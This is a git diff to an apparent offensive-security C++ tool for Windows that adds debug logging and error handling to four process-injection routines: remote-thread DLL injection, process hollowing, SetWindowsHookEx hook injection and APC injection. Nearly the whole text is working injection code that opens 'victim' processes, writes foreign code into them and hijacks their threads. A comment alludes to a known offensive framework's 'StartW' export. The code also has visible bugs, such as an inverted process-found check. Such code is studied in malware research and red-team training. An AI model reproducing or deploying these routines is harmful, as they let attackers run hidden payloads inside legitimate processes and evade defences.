@@ -18,8 +18,9 @@ using namespace std;
 
 void DbgPrint(char *msg)
 {
+
 #ifdef DEBUG
-	cout << "Error: " << msg << endl;
+	cout << GetLastError() << " " << msg << endl;
 #endif
 }
 
@@ -59,10 +60,14 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 
 	/* Snapshot of processes */
 	DWORD processId{};
+	DbgPrint("[+] creating process snapshot");
 	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Fucking lazy auto bullshit, also snap all processes
 	if (hSnapshot == INVALID_HANDLE_VALUE)
+	{
+		DbgPrint("[!] failed to create process snapshot");
 		return FALSE;
-
+	}
+	DbgPrint("[+] Created process snapshot\n\n");
 	PROCESSENTRY32 pe{}; /* Describes an entry from a list of the processes residing
 						 in the system address space when a snapshot was taken.
 						 The size of the structure, in bytes. Before calling the
@@ -77,10 +82,12 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 
 
 	/* get first PID */
+	DbgPrint("[+] Starting process search");
+	BOOL isProcessFound = FALSE;
 	if (Process32First(hSnapshot, &pe) == FALSE)  //Get first "link" I guess
 	{
 		CloseHandle(hSnapshot);
-		DbgPrint("unable to take first process snapshot");
+		DbgPrint("[!] unable to take first process snapshot");
 		return FALSE;
 	}
 
@@ -88,7 +95,12 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 	{
 		CloseHandle(hSnapshot);
 		processId = pe.th32ProcessID;
+		isProcessFound = TRUE;
+		#ifdef DEBUG
+		cout << "[+] Got PID: " << processId << endl;
+		#endif
 	}
+
 	/* End get first PID */
 
 	/* Get the rest and process like the first */
@@ -96,23 +108,39 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 	{
 		if (_wcsicmp(pe.szExeFile, processname) == 0)
 		{
+			DbgPrint("[+] Closing handle to process snapshot");
 			CloseHandle(hSnapshot);
 			processId = pe.th32ProcessID;
+			DbgPrint("[+] Found Process");
+			#ifdef DEBUG
+			cout << "[+] Got PID: " << processId << endl;
+			#endif
+			break;
 		}
 	}
-
+	DbgPrint("[+] Done with process search\n\n");
+	//Check if process was found
+	if (isProcessFound)
+	{
+		DbgPrint("[!] failed to find process");
+		return FALSE;
+	}
+	
+	
 	/* this portion get it and puts it in the memory of the remote process */
 	// get size of the dll's path
 	auto size = wcslen(lpdllpath) * sizeof(TCHAR);
 	
 	// open selected process
+	DbgPrint("[+] Opening Process");
 	auto hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);
 	if (hVictimProcess == NULL) // check if process open failed
 	{
-		DbgPrint("Failed to open process");
+		DbgPrint("[!]Failed to open process");
 		return FALSE;
 	}
-
+	DbgPrint("[+] Open'd Process\n\n");
+	DbgPrint("[+] Allocating some memory in the remote process");
 	// allocate memory in the remote process
 	auto pNameInVictimProcess = VirtualAllocEx(hVictimProcess, 
 													nullptr,
@@ -120,11 +148,12 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 						MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pNameInVictimProcess == NULL) //Check if allocation failed
 	{
-		DbgPrint("allocation of memory failed, WFT?");
+		DbgPrint("[!] allocation of memory failed, WFT?");
 		return FALSE;
 	}
-
+	DbgPrint("[+] allocated memory\n\n");
 	// write the DLL to memory
+	DbgPrint("[+] Writing to remote process mem");
 	auto bStatus = WriteProcessMemory(hVictimProcess, 
 								pNameInVictimProcess, 
 										   lpdllpath, 
@@ -132,31 +161,37 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 												nullptr);
 	if (bStatus == 0)
 	{
-		DbgPrint("failed to write memory to the process");
+		DbgPrint("[!] failed to write memory to the process");
 		return FALSE;
 	}
 
+	DbgPrint("[+] Wrote remote process memory\n\n");
 	
 	// gets a handle for kernel32dll's LoadLibrary call
+	DbgPrint("[+] Getting handle for kernel32");
 	auto hKernel32 = GetModuleHandle(L"kernel32.dll");
 	if (hKernel32 == NULL)
 	{
-		DbgPrint("Unable to find Kernel32 in process, what the fuck did you do?");
+		DbgPrint("[!] Unable to find Kernel32 in process, what the fuck did you do?");
+		return FALSE;
 	}
+	DbgPrint("[+] Got kernel32 handle");
+	DbgPrint("[+] Getting loadLibraryW handle");
 	auto LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
 	if (LoadLibraryAddress == NULL) //Check if GetProcAddress works; if not try some ugly as sin correction code
 	{
-		DbgPrint("Unable to find LoadLibraryW, What is this: Windows 2000?");
-		DbgPrint("Trying LoadLibraryA");
+		DbgPrint("[-] Unable to find LoadLibraryW, What is this: Windows 2000?");
+		DbgPrint("[-] Trying LoadLibraryA");
 		if ((LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA")) == NULL)
 		{
-			DbgPrint("LoadLibraryA failed as well. You're on your own.");
+			DbgPrint("[!] LoadLibraryA failed as well. You're on your own.");
 			return FALSE;
 		}
 	}
-	
+	DbgPrint("[+] Got loadLibrary handle\n\n");
 	
 	// Using the above objects execute the DLL in the remote process
+	DbgPrint("[+] starting new thread to execute injected dll");
 	auto hThreadId = CreateRemoteThread(hVictimProcess, 
 		nullptr, 
 		0, 
@@ -166,15 +201,20 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 		nullptr);
 	if (hThreadId == NULL)
 	{
-		DbgPrint("failed to create remote process");
+		DbgPrint("[!] failed to create remote process");
+		return FALSE;
 	}
+	DbgPrint("[+] started new thread\n\n");
 
 	/*if (bStatus == NULL)
 		return FALSE; 
 		NOT NEEDED ANYMORE*/ 
+	DbgPrint("[+] waiting for thread to execute");
 	WaitForSingleObject(hThreadId, INFINITE);
+	DbgPrint("[+] Done!!!! Closing handle\n");
 
 	CloseHandle(hVictimProcess);
+	DbgPrint("[+] Closed process handle");
 	VirtualFreeEx(hVictimProcess, pNameInVictimProcess, size, MEM_RELEASE);
 
 	DbgPrint("Injected Successfully");
@@ -253,8 +293,10 @@ PE_FILE ParsePE(const char* PE)
 // Based on John Leitch's paper "Process Hollowing"
 BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 {
-
+	DbgPrint("==============Initial Processing==================");
+	DbgPrint("[ ] Opening Binary to read into buffer");
 	tuple<bool, char*, fstream::pos_type>  bin = OpenBinary(inj_exe);
+	DbgPrint("[+] Opened binary\n");
 	if (!get<0>(bin)) // verify that tuple exists (file is open)
 	{
 		cout << "Error to open file";
@@ -263,9 +305,10 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 
 	char* PE_file = get<1>(bin); // get pointer to binary as char array
 	size_t size_of_pe = get<2>(bin);  //get the filesize from the OpenBinary call
-
+	DbgPrint("[ ] Parsing PE from buffer");
 	auto Parsed_PE = ParsePE(PE_file);  // Get the PE_FILE object from the function (local, not a standard C++ function)
-										// PE_FILE is defined in the Injection.h file
+	DbgPrint("[+] Got PE info");		// PE_FILE is defined in the Injection.h file
+
 
 	auto pStartupInfo = new STARTUPINFO();  // Specifies the window station, desktop, standard handles, 
 											// and appearance of the main window for a process at creation time.
@@ -273,10 +316,12 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 
 	auto remoteProcessInfo = new PROCESS_INFORMATION();  // Structure that contains the information about a process object
 													// MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
-	
+	DbgPrint("===================================================\n\n");
+	DbgPrint("============Creating Process to Infect=============");
+
 	/* CreateProcess is a complex call so I am breaking it out into paramaters*/
 	//MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
-
+	DbgPrint("[ ]Creating host process");
 	CreateProcess(target,			//lpApplicationName		name of process to be executed
 		nullptr,					//lpCommandLine			command line to be executed (not used so Application name is used)
 		nullptr,					//lpProcessAttributes	user specified process params using SECURITY_ATTRIBUTES struct
@@ -290,116 +335,128 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 
 	if (!remoteProcessInfo->hProcess)	// no real need to check the output of Create Process because all the return info needs to be checked anyway
 	{
-		DbgPrint("Failed to create remote thread");
+		DbgPrint("[-] Failed to create remote thread");
 		return FALSE;
 	}
 	if (SuspendThread(remoteProcessInfo->hThread) == -1)	//Suspend thread to hijack
 	{
-		DbgPrint("Failed to stop remote process");
+		DbgPrint("[-] Failed to stop remote process");
 		return FALSE;
 	}
-
+	DbgPrint("[+] Created host process");
 	DWORD dwReturnLength;	//used later in remote call
-
+	DbgPrint("===================================================\n\n");
 	// read remote PEB
 	PROCESS_BASIC_INFORMATION ProcessBasicInformation; //Because having 3 diffrent processinfo structures makes sense
-
+	
+	DbgPrint("============Hijacking Remote Functions==============");
 	// get NtQueryInformationProcess
+	DbgPrint("[ ] loading remote process libraries and functions to build new PEB");
+	DbgPrint("[ ] getting ntdll");
 	auto handleToRemoteNtDll = LoadLibrary(L"ntdll");	//Locate NTDLL in new process memory
 	if (!handleToRemoteNtDll)
 	{
-		DbgPrint("failed to get remote handle to NTDLL");
+		DbgPrint("[-] failed to get remote handle to NTDLL");
 		return FALSE;
 	}
+	DbgPrint("[+] got ntdll\n");
+	DbgPrint("[ ] getting NtQueryInformationProcess");
 	auto fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
 	if (!fpNtQueryInformationProcess)
 	{
-		DbgPrint("Failed to locate remote NtQueryInformationProcess function");
+		DbgPrint("[-] Failed to locate remote NtQueryInformationProcess function");
 		return FALSE;
 	}
+	DbgPrint("[+] got NtQueryInformationProcess\n");
+	DbgPrint("[ ] Executing NtQueryInformationProcess");
 	//Cast into useable function, thanks C++ template hacks! 
 	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);
 
 	//Call remote process NtQueryInformationProcess function
-	remoteNtQueryInformationProcess(remoteProcessInfo->hProcess, 
-		PROCESSINFOCLASS(0), 
-		&ProcessBasicInformation, 
-		sizeof(PROCESS_BASIC_INFORMATION), 
+	remoteNtQueryInformationProcess(remoteProcessInfo->hProcess,
+		PROCESSINFOCLASS(0),
+		&ProcessBasicInformation,
+		sizeof(PROCESS_BASIC_INFORMATION),
 		&dwReturnLength);
-	
+	DbgPrint("[+] executed NtQueryInformationProcess\n");
 	auto dwPEBBAddress = ProcessBasicInformation.PebBaseAddress; //remote PEB info
 
 	auto pPEB = new PEB(); //create new PEB object
-
+	DbgPrint("[ ] reading process memory to locate remote PEB");
 	if (!ReadProcessMemory(remoteProcessInfo->hProcess,	// load info for PEB of remote process 
 		static_cast<LPCVOID>(dwPEBBAddress),
 		pPEB,
 		sizeof(PEB),
 		nullptr))
 	{
-		DbgPrint("failed to load remote PEB");
+		DbgPrint("[-] failed to load remote PEB");
 		return FALSE;
 	}
-
+	DbgPrint("[+] read forign PEB");
+	DbgPrint("[+] parsed remote PEB\n");
 	// remote image size calculation
 	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS64 + (sizeof IMAGE_SECTION_HEADER) * 100;
-	
+
 	// Create new buffer to hold new process
 	//I will admit having a BYTE type in windows is pretty nice, I think it just resolves into an unsigned char tho...
 	auto remoteProcessBuffer = new BYTE[BUFFER_SIZE];
 
 	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote processes' image base
-	
+	DbgPrint("[ ] Reading process memory to find process image");
 	if (!ReadProcessMemory(remoteProcessInfo->hProcess, // read process image from loaded process (so we can replace these parts later)
-		remoteImageAddressBase, 
-		remoteProcessBuffer, 
-		BUFFER_SIZE, 
+		remoteImageAddressBase,
+		remoteProcessBuffer,
+		BUFFER_SIZE,
 		nullptr))
 		return FALSE;
-
+	DbgPrint("[+] found remote process image\n");
 	// get handle to unmap remote process sections for replacement
+	DbgPrint("[ ] loading remote call to unmap");
 	auto fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
-	
 	//Create callable version of remote unmap call
 	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);
 
 	//Unmap remote process image (oh boy we are hijacking this shit now!)
 	if (ZwUnmapViewOfSection(remoteProcessInfo->hProcess, const_cast<PVOID>(remoteImageAddressBase)))
+	{
+		DbgPrint("[-] failed to unmap remote process image");
 		return FALSE;
-
+	}
+	DbgPrint("[+] unmap'd remote process image\n");
 	// Allocating memory for our PE file
 	/* 
 	another complex call that we will now disect 
 	MSDN: https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa366890(v=vs.85).aspx
 	*/
 	// TODO: allocate this memory as read write and then remove the write flag and replace with exec flag
-	
-	auto pRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,		//hProcess			handle to the remote process
+	DbgPrint("[!] hijacking remote image");
+	DbgPrint("[ ] allocating memory in forign process");
+	auto hijackerRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,		//hProcess			handle to the remote process
 		const_cast<LPVOID>(remoteImageAddressBase),						//lpAddress			address to allocate at (here we are using the old process image base address)
 		Parsed_PE.inh32.OptionalHeader.SizeOfImage,						//dwSize			size of  allocation (our new pe's length goes here 
 		MEM_COMMIT | MEM_RESERVE,										//flAllocationType	The type of memory allocation this part is system magic so RTFM at MSDN
 		PAGE_EXECUTE_READWRITE);										//flProtect			Tell the kernel to allocate with these protections, which is none so... "RAWDOG IT!!!"
 	
-	if (!pRemoteImage)	//if the call screws up then just die
+	if (!hijackerRemoteImage)	//if the call screws up then just die
 	{
-		DbgPrint("failed to allocate memory in remote process");
+		DbgPrint("[-] failed to allocate memory in remote process");
 		return FALSE;
 	}
-
+	DbgPrint("[+] alocated memory in remote process\n");
 	// calculate relocation delta
 	auto dwDelta = ULONGLONG(remoteImageAddressBase) - Parsed_PE.inh32.OptionalHeader.ImageBase;  // change to pImageAddressBase
 
 	//Here we cast the new process to a function pointer that we will cause the remote process to execute
 	Parsed_PE.inh32.OptionalHeader.ImageBase = reinterpret_cast<ULONGLONG>(remoteImageAddressBase);
 
-	
+	DbgPrint("[ ] writing hijack image to remote process");
 	if (!WriteProcessMemory(remoteProcessInfo->hProcess,		//hProcess					the handle to the remote process
 		const_cast<LPVOID>(remoteImageAddressBase),				//lpBaseAddress				The address to start writing to
 		PE_file,												//lpBuffer					the buffer to write to the process
 		Parsed_PE.inh32.OptionalHeader.SizeOfHeaders,			//nSize						number of bytes to write
 		nullptr))												//lpNumberOfBytesWritten	(unused) int pointer to write the return value to
 	{
-		DbgPrint("failed to write new headers to remote process memory");
+		DbgPrint("[-] failed to write new headers to remote process memory");
 		return FALSE;
 	}
 
@@ -413,11 +470,12 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 			Parsed_PE.ish[i].SizeOfRawData,
 			nullptr))
 		{
-			DbgPrint("failed to write new process section");
+			DbgPrint("[-] failed to write one of new process sections");
 			return FALSE;
 		}
 	}
-
+	DbgPrint("[+] wrote process mem");
+	DbgPrint("===================================================\n\n");
 	// if delta > 0  - todo
 
 	// cast new callable entry point from remote process base address
@@ -429,6 +487,8 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	// Just before switching to the other thread, Windows saves values in registers of the present thread
 	// so that when the time comes to resume the thread, Windows can restore the last *environment* of that thread.
 	// The saved values of the registers are collectively called a context.
+	DbgPrint("==============Hijacking Remote Process=================");
+	DbgPrint("[ ] saving debugging context of process");
 	LPCONTEXT remoteProcessContext = new CONTEXT();		//This is a debugging structure to hold the old process "context" like registers and whatnot
 	remoteProcessContext->ContextFlags = CONTEXT_FULL;	// A value indicating which portions of the Context structure should be initialized. This parameter influences the size of the initialized Context structure.
 
@@ -438,27 +498,32 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 		DbgPrint("Failed to get debugging context of remote process");
 		return FALSE;
 	}
-
+	DbgPrint("[+] saved process context\n");
+	
+	DbgPrint("[*] modifying proc context RCX->EntryPoint()");
 	remoteProcessContext->Rcx = dwEntrypoint;			//Set RCX register to the EntryPoint
-
+	
+	DbgPrint("[ ] restoring modified context");
 	if (!SetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
 	{
-		DbgPrint("failed to set remote process context");
+		DbgPrint("[-] failed to set remote process context");
 		return FALSE;
 	}
 	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
 	{
-		DbgPrint("failed to set control thread context");
+		DbgPrint("[-] failed to set control thread context");
 		return FALSE;
 	}
+	DbgPrint("[+] restored process context\n");
 
-
+	DbgPrint("[ ] resuming hijacked process");
 	if (!ResumeThread(remoteProcessInfo->hThread))
 	{
-		DbgPrint("failed to resume remote process");
+		DbgPrint("[-] failed to resume remote process");
 		return FALSE;
 	}
-
+	DbgPrint("[!] process hijacked!");
+	DbgPrint("===================Et Fin!=========================");
 	  ////////////////////////////////////////////////////////
 	 //////AND THATS IT, WE HAVE HIJACKED A PROCESS!!!!//////
 	////////////////////////////////////////////////////////
@@ -474,21 +539,48 @@ BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
 	// and a 64 - bit DLL cannot be injected into a 32 - bit process.If an application requires the use of hooks in other processes, 
 	// it is required that a 32 - bit application call SetWindowsHookEx to inject a 32 - bit DLL into 32 - bit processes, 
 	// and a 64 - bit application call SetWindowsHookEx to inject a 64 - bit DLL into 64 - bit processes.The 32 - bit and 64 - bit DLLs must have different names.
-
+	DbgPrint("[ ] loading module in local process");
 	auto hdll = LoadLibrary(dll_name);
+	DbgPrint("[+] loaded dll\n");
 
 	typedef LRESULT(WINAPI * MyProc)(int code, WPARAM wp, LPARAM lp); // export from calc_dll.dll
 
 	auto mp = MyProc(GetProcAddress(hdll, "MyProc"));
+	//auto mp = MyProc(GetProcAddress(hdll, "StartW"));
+	//If you know who uses StartW, hush, its a secret ;)
 
 	auto pStartupInfo = new STARTUPINFO();
 	auto pProcessInfo = new PROCESS_INFORMATION();
-	CreateProcess(target, nullptr, nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS, nullptr, nullptr, pStartupInfo, pProcessInfo);
+	DbgPrint("[ ] creating process to hook");
+	CreateProcess(target, 
+		nullptr, 
+		nullptr, 
+		nullptr, 
+		FALSE, 
+		NORMAL_PRIORITY_CLASS, 
+		nullptr, 
+		nullptr, 
+		pStartupInfo, 
+		pProcessInfo);
+
 	if (!pProcessInfo->hProcess)
+	{
+		DbgPrint("[-] failed to create process");
 		return FALSE;
-
-	auto hProc = SetWindowsHookEx(WH_CBT, mp, hdll, pProcessInfo->dwThreadId);
-
+	}
+	DbgPrint("[+] Created hook process\n");
+	
+	DbgPrint("[ ] creating process hook");
+	auto hProc = SetWindowsHookEx(WH_CBT,	// Installs a hook procedure that receives notifications useful to a CBT application
+		mp,									// my proc symbol taken from the dll
+		hdll,								// dll containing my proc
+		pProcessInfo->dwThreadId);			// dword to the thread (something something windows store) RTFM
+	if (!hProc)
+	{
+		DbgPrint("[-] failed to hook process");
+		return FALSE;
+	}
+	DbgPrint("[+] hook injected");
 	UnhookWindowsHookEx(hProc);
 
 	return TRUE;
@@ -501,21 +593,55 @@ BOOL APCinjection(TCHAR target[], TCHAR *dll_name) {
 
 	DWORD pid{};
 	vector<DWORD> tids{};
-
+	// TODO: in code documentation and break up the messy dually
+        // nested function calls for demonstration purposes
+        // note to self (perhaps dllinjection/process replacement
+        // could be done in a bunch of natsy nested calls)
+        // I may do that as a joke. X in one line of code XD
+	DbgPrint("[ ] finding matching process name");
 	if (!FindProcess(target, pid, tids))
+	{
+		DbgPrint("[-] failed to find process");
 		return FALSE;
+	}
+	DbgPrint("[+] found prcoess\n");
+	DbgPrint("[ ] Opening Process");
 	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
 	if (!hProcess)
+	{
+		DbgPrint("[-] failed to open proceess");
 		return FALSE;
-	auto pVa = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	}
+	DbgPrint("[+] Opened process\n");
+	
+	DbgPrint("[ ] allocating memory in process");
+	auto pVa = VirtualAllocEx(hProcess, 
+		nullptr, 
+		1 << 12, 
+		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	DbgPrint("[+] allocated memory in remote process\n");
+	DbgPrint("[ ] writing remote process memeory");
 	if (!WriteProcessMemory(hProcess, pVa, lpdllpath, sizeof(lpdllpath), nullptr))
+	{
+		DbgPrint("[-] failed to write remote process memory");
 		return FALSE;
+	}
+	DbgPrint("[+] wrote remote process memory");
+	DbgPrint("[ ] Enumerating APC threads in remote process");
 	for (const auto &tid : tids) {
 		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
 		if (hThread) {
-			QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW"), hThread, (ULONG_PTR)pVa);
+			DbgPrint("[*] found thread");
+			QueueUserAPC(
+				(PAPCFUNC)GetProcAddress(
+					GetModuleHandle(L"kernel32"), 
+					"LoadLibraryW"), 
+				hThread, 
+				(ULONG_PTR)pVa);
+			// almost looks like a fuckin' nested SQL statment
 			CloseHandle(hThread);
 		}
 	}
 	CloseHandle(hProcess);
+	return TRUE;
 }
